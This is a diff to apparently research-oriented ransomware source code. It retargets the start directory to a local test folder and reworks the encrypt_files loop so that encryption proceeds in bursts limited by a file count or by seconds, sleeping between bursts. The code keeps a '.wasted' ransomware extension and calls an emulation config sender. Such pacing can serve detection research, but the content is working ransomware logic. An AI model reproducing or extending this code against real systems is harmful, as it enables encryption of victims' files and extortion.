@@ -17,7 +17,8 @@ from emulate import send_config
 # ============ 		GLOBALS 	  ==============
 # ============================================================
 
-LINUX_STARTDIRS = [os.environ['HOME'] + '/test_ransomware']
+# LINUX_STARTDIRS = [os.environ['HOME'] + '/test_ransomware']
+LINUX_STARTDIRS = ['/home/jluech/test']  # TODO: replace with original
 EXTENSION = ".wasted"  # Ransomware custom extension
 
 # ============================================================
@@ -240,19 +241,24 @@ def encrypt_files(key, start_dirs):
                     send_config()
                     updated = True
 
-                file_counter += 1  # only counting files if relevant
+                file_counter += 1
 
-                if duration > 0 and limit_files:
-                    print("bursting for", file_counter, "files")
-                    if file_counter >= duration:
-                        print("sleeping for", config["BURST"]["pause"])
-                        time.sleep(int(config["BURST"]["pause"]))
+                if duration > 0:  # burst duration is limited
+                    reset_burst = False
+                    if limit_files:
+                        print("bursting for", file_counter, "files")
+                        if file_counter >= duration:
+                            reset_burst = True
+                            print("sleeping for", config["BURST"]["pause"])
+                            time.sleep(int(config["BURST"]["pause"]))
+                    else:  # limit seconds instead of files
+                        print("bursting for", time.time() - burst_start, "seconds")
+                        if time.time() - burst_start >= duration:
+                            reset_burst = True
+                            print("sleeping for", config["BURST"]["pause"])
+                            time.sleep(int(config["BURST"]["pause"]))
+                    if reset_burst:
                         file_counter = 0
-                if duration > 0 and not limit_files:  # limit seconds instead of files
-                    print("bursting for", time.time() - burst_start, "seconds")
-                    if time.time() - burst_start >= duration:
-                        print("sleeping for", config["BURST"]["pause"])
-                        time.sleep(int(config["BURST"]["pause"]))
                         burst_start = time.time()
 
 
